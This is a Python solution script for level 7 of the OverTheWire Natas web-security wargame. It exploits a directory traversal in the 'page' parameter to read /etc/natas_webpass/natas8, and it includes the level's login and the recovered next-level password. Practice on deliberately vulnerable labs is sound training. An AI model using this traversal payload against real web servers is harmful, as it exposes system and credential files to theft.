#!/usr/bin/env python

import requests
from bs4 import BeautifulSoup

username = "natas7"
password = "7z3hEENjQtflzgnT29q7wAvMNfZdh0i9"

url = (
    "http://%s.natas.labs.overthewire.org/index.php?page=../../../../../etc/natas_webpass/natas8"
    % username
)

session = requests.Session()

# post_data = {"secret": "FOEIUWGHFEEUHOFUOIU", "submit": "submit"}

response = session.post(url, auth=(username, password))
content = response.text
soup = BeautifulSoup(content, "html.parser")

print(soup.prettify())
# print content

# this time it looks like it's a directory traversal challenge
# we know that all the passwords are stored on the server on /etc/natas_webpass/natas + the user number
# in our case it's in /etc/natas_webpass/natas8
# so we first need a parameter to use and it's { page }
# and the password is DBfUBfqQG69KvJvJ1iAbMoIpwSNQ9bWe
